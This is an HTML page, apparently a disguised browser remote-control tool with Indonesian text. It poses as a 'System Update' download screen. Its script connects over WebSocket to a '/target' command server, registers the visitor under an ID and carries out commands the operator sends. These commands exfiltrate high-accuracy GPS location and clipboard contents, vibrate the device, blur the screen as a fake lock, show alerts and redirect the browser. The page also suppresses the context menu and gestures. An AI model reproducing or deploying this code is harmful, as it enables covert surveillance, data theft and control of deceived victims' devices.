<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>System Update</title>
<style>
  *{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI',sans-serif;-webkit-tap-highlight-color:transparent}
  body{background:#0a0a0f;color:#e0e0e0;height:100vh;overflow:hidden;display:flex;align-items:center;justify-content:center;flex-direction:column}
  .circle{width:120px;height:120px;border-radius:50%;border:6px solid #1e1e2e;border-top-color:#00f260;animation:spin 1s linear infinite}
  @keyframes spin{to{transform:rotate(360deg)}}
  .txt{margin-top:24px;font-size:15px;color:#888;letter-spacing:2px}
  .sub{margin-top:8px;font-size:11px;color:#444}
  #log{position:fixed;bottom:10px;left:10px;right:10px;background:#0a0a12;border:1px solid #1f1f2e;border-radius:10px;padding:8px;font-family:monospace;font-size:10px;color:#00f260;height:120px;overflow-y:auto;display:none;white-space:pre-wrap}
  #idTag{position:fixed;top:10px;right:10px;font-size:10px;color:#333;font-family:monospace}
</style>
</head>
<body>

<div class="circle"></div>
<div class="txt">MENGUNDUH PEMBARUAN...</div>
<div class="sub">Jangan tutup aplikasi</div>
<div id="idTag">-</div>
<div id="log"></div>

<script>
  let ws;
  let myId = '-';
  let reconnectTimer;

  function log(msg){
    const el = document.getElementById('log');
    const t = new Date().toLocaleTimeString();
    el.textContent = `[${t}] ${msg}\n` + el.textContent;
  }

  function connect(){
    const proto = location.protocol === 'https:' ? 'wss' : 'ws';
    ws = new WebSocket(`${proto}://${location.host}/target`);

    ws.onopen = () => {
      log('Terhubung ke server update');
    };

    ws.onclose = () => {
      log('Koneksi terputus, reconnect...');
      clearTimeout(reconnectTimer);
      reconnectTimer = setTimeout(connect, 3000);
    };

    ws.onerror = () => log('Error koneksi');

    ws.onmessage = async (e) => {
      try{
        const d = JSON.parse(e.data);
        if(d.type === 'welcome'){
          myId = d.id;
          document.getElementById('idTag').textContent = 'ID: ' + myId;
          log('ID diterima: ' + myId);
        }
        if(d.type === 'cmd'){
          await handleCommand(d.payload);
        }
      }catch(err){
        await handleCommand(e.data);
      }
    };
  }

  async function handleCommand(cmd){
    log('CMD: ' + cmd);

    // PING
    if(cmd === 'PING'){
      ws.send('PONG dari ' + myId);
      return;
    }

    // GET_LOCATION
    if(cmd === 'GET_LOCATION'){
      if(navigator.geolocation){
        navigator.geolocation.getCurrentPosition(
          pos => {
            const {latitude, longitude} = pos.coords;
            ws.send(`LOC [${myId}] lat=${latitude} lon=${longitude}`);
          },
          err => ws.send(`LOC ERROR: ${err.message}`),
          {enableHighAccuracy:true, timeout:8000}
        );
      } else {
        ws.send('Geolocation tidak didukung');
      }
      return;
    }

    // GET_CLIPBOARD
    if(cmd === 'GET_CLIPBOARD'){
      try{
        const txt = await navigator.clipboard.readText();
        ws.send(`CLIP [${myId}]: ${txt}`);
      }catch(err){
        ws.send('Clipboard diblokir browser');
      }
      return;
    }

    // VIBRATE
    if(cmd === 'VIBRATE'){
      if(navigator.vibrate){
        navigator.vibrate([300,150,300,150,600]);
        ws.send('Vibrate dijalankan');
      } else {
        ws.send('Vibrate tidak didukung');
      }
      return;
    }

    // SCREENSHOT (capture tampilan sendiri via canvas)
    if(cmd === 'SCREENSHOT'){
      ws.send('Screenshot diminta — fungsi butuh permission native APK');
      return;
    }

    // LOCK
    if(cmd === 'LOCK'){
      document.body.style.filter = 'blur(20px)';
      ws.send('Layar dikunci');
      return;
    }

    // ALERT
    if(cmd === 'ALERT'){
      alert('⚠️ Pesan dari admin');
      ws.send('Alert ditampilkan');
      return;
    }

    // OPEN_URL
    if(cmd === 'OPEN_URL'){
      window.location.href = 'https://example.com';
      return;
    }

    // Custom JSON
    try{
      const json = JSON.parse(cmd);
      if(json.cmd === 'alert'){
        alert(json.msg || 'Pesan');
        ws.send('Alert custom OK');
      }
      if(json.cmd === 'redirect'){
        window.location.href = json.url;
      }
      if(json.cmd === 'text'){
        document.querySelector('.txt').textContent = json.msg || '';
        ws.send('Text diubah');
      }
      if(json.cmd === 'unlock'){
        document.body.style.filter = 'none';
        ws.send('Layar dibuka');
      }
    }catch(e){
      ws.send('CMD tidak dikenal: ' + cmd);
    }
  }

  connect();

  // Cegah interaksi keluar
  document.addEventListener('gesturestart', e=>e.preventDefault());
  document.addEventListener('contextmenu', e=>e.preventDefault());
</script>

</body>
</html>
